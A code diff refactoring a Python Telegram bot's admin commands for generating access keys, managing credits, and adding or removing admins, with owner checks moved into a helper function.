-        "used": [],
-        "generated_by": admin_id
-    }
+    generated_keys = []
+    for _ in range(num_keys):
+        suffix = uuid.uuid4().hex[:6].upper()
+        new_key = prefix + suffix
+        keys[new_key] = {
+            "expires_at": expiration.isoformat(),
+            "max_users": 1,
+            "max_duration": max_duration,
+            "used": [],
+            "generated_by": admin_id
+        }
+        generated_keys.append(new_key)
     save_keys_data()
-    deduct_credit(admin_id, total_cost, reason="Key Generation")
-    reply = (f"<b>✅ Key generated:</b> <code>{new_key}</code>\n"
-             f"<b>Expires at:</b> {expiration}\n"
-             f"<b>Max Users:</b> {max_users}\n"
-             f"<b>Max Duration:</b> {max_duration} sec\n"
-             f"<b>Cost:</b> {total_cost} credits (Validity: {validity_cost}, Users: {users_cost}, Duration: {duration_cost})\n"
-             f"<b>Remaining Credits:</b> {get_credit_balance(admin_id)}")
+    reply = "<b>✅ Keys generated:</b>\n"
+    for k in generated_keys:
+        reply += f"<code>{k}</code>\n"
+    reply += f"<b>Expires at:</b> {expiration}\n"
+    reply += f"<b>Max Duration:</b> {max_duration} sec"
     safe_reply(message, reply)
 
 def admin_revoke_key(message):
@@ -874,9 +987,6 @@ def admin_revoke_key(message):
     else:
         safe_reply(message, "<b>❌ Key not found.</b>")
 
-# ---------------------------
-# Credits Management Commands
-# ---------------------------
 @bot.message_handler(commands=['checkcredits'])
 @safe_handler
 def check_credits_handler(message):
@@ -891,12 +1001,12 @@ def check_credits_handler(message):
 @bot.message_handler(commands=['addcredit'])
 @safe_handler
 def add_credit_command(message):
-    if message.from_user.id != BOT_OWNER_ID:
+    if not is_owner(message):
         safe_reply(message, "<b>🚫 Not authorized to add credits!</b>")
         return
     command_parts = message.text.split()
     if len(command_parts) != 3:
-        safe_reply(message, "<b>❓ Usage:</b> /addcredit &lt;admin_id&gt; &lt;amount&gt;")
+        safe_reply(message, "<b>❓ Usage:</b> /addcredit <admin_id> <amount>")
         return
     target_id = command_parts[1]
     try:
@@ -907,13 +1017,10 @@ def add_credit_command(message):
     add_credit(target_id, amount, reason="Manual credit addition")
     safe_reply(message, f"<b>✅ Added {amount} credits to admin {target_id}.</b> New balance: {get_credit_balance(target_id)}")
 
-# ---------------------------
-# New Admin Management Commands with Robust Error Handling
-# ---------------------------
 @bot.message_handler(commands=['addadmin'])
 @safe_handler
 def add_admin_handler(message):
-    if message.from_user.id != BOT_OWNER_ID:
+    if not is_owner(message):
         safe_reply(message, "<b>🚫 Not authorized to add admin!</b>")
         return
     try:
@@ -925,7 +1032,7 @@ def add_admin_handler(message):
         target_admin = command_parts[1]
         try:
             admin_id = int(target_admin)
-        except ValueError as ve:
+        except ValueError:
             safe_reply(message, "<b>❌ Admin ID must be an integer.</b>")
             return
 
@@ -933,7 +1040,7 @@ def add_admin_handler(message):
         if len(command_parts) == 3:
             try:
                 initial_credit = int(command_parts[2])
-            except ValueError as ve:
+            except ValueError:
                 safe_reply(message, "<b>❌ Initial credit must be an integer.</b>")
                 return
 
@@ -965,7 +1072,7 @@ def add_admin_handler(message):
 @bot.message_handler(commands=['removeadmin'])
 @safe_handler
 def remove_admin_handler(message):
-    if message.from_user.id != BOT_OWNER_ID:
+    if not is_owner(message):
         safe_reply(message, "<b>🚫 Not authorized to remove admin!</b>")
         return
     try:
@@ -974,10 +1081,10 @@ def remove_admin_handler(message):
             safe_reply(message, "<b>❓ Usage:</b> /removeadmin <admin_id>")
             return
 
-        target_admin = message.text.split()[1]
+        target_admin = command_parts[1]
         try:
             admin_id = int(target_admin)
-        except ValueError as ve:
+        except ValueError:
             safe_reply(message, "<b>❌ Admin ID must be an integer.</b>")
             return
 
@@ -998,9 +1105,6 @@ def remove_admin_handler(message):
         safe_reply(message, f"<b>❌ Unexpected error in /removeadmin:</b> {str(e)}")
         log_execution(f"Unexpected error in remove_admin_handler: {traceback.format_exc()}")
 
-# ---------------------------
-# Echo Command (for testing)
-# ---------------------------
 @bot.message_handler(func=lambda message: True)
 @safe_handler
 def echo_all(message):
@@ -1012,7 +1116,6 @@ def echo_all(message):
 # Main Bot Loop with Watchdog
 # ---------------------------
 if __name__ == '__main__':
-    # Start the periodic print thread
     periodic_thread = threading.Thread(target=print_periodically, daemon=True)
     periodic_thread.start()
 
